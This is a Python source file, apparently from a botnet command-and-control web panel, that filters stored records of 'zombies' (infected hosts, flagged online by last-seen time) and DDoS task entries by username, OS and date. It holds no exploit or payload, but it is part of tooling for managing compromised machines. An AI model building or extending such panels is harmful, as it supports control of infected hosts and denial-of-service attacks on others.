#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import datetime, json

from app import logger

from app.modules.crud import read_data
from app.forms import FilterForm


class DataFilter:
    def __init__(self, data_type, default_filters=None):

        self.form = FilterForm()
        self.error = None
        self.data = None
        self.filters = {}
        if default_filters:
            self.filters.update(default_filters)

        if data_type == 'ddos_attacks':
            data_type = 'tasks'
            self.filters['task_type'] = 'dos'
        self.data_type = data_type

    def merge_values(self, value_a, value_b):
        if value_a is None:
            value_a = ''
        if value_b is None:
            value_b = ''
        return ((value_a + ' ' + value_b).rstrip()).lstrip()

    def parse_inputs(self, request):
        filters = {}
        if (request.method == 'POST') and ('filter_btn' in request.form):
            if request.form.get('by_username'):
                filters['username'] = request.form.get('by_username')
            if request.form.get('by_os'):
                filters['os'] = request.form.get('by_os')
            if request.form.get('by_date_bef') or request.form.get('by_time_bef'):
                filters['datetime_bef'] = self.merge_values(request.form.get('by_date_bef'),
                                                       request.form.get('by_time_bef'))
            if request.form.get('by_date_aft') or request.form.get('by_time_aft'):
                filters['datetime_aft'] = self.merge_values(request.form.get('by_date_aft'),
                                                       request.form.get('by_time_aft'))
        return filters

    def set_filters(self, request):
        if 'filter_btn' in request.form:
            if self.form.validate_on_submit():
                self.filters = self.parse_inputs(request)

    def run(self, request=None):
        logger.log('filtered data \'{}\' requested'.format(self.data_type), 'INFO')

        if request:
            self.set_filters(request)

        self.data = read_data(self.data_type, self.filters)
        logger.log('data: {}'.format(self.data), 'CRITICAL')
        logger.log('data_type: {}'.format(self.data_type), 'CRITICAL')
        logger.log('filters: {}'.format(self.filters), 'CRITICAL')

        if not self.data:
            self.error = '0 {} found'.format(self.data_type)
            return False

        if self.data_type == 'zombies':
            data = self.data
            for row in data:
                if 'last_seen' in row:
                    if ((datetime.datetime.now() < (datetime.datetime.strptime(row['last_seen'], '%Y-%m-%d %H:%M:%S') + datetime.timedelta(minutes=10)))
                            and (row["last_seen"] != row["created_at"])):
                        row['on'] = 'true'
                    else:
                        row['on'] = 'false'
                if ('sysinfo' in row):
                    if row['sysinfo'] is None:
                        row['sysinfo'] = ''
                    else:
                        row['sysinfo'] = json.loads(row['sysinfo'])

            # post-filters (client side)
            if ("os" in self.filters):
                data = [row for row in data if
                        (("os" in row['sysinfo']) and (row['sysinfo']['os'] is not None)
                         and (row['sysinfo']['os'] == self.filters['os']))]

            self.data = data

        logger.log('filtered data: {}'.format(self.data), 'DEBUG')
        return self.data
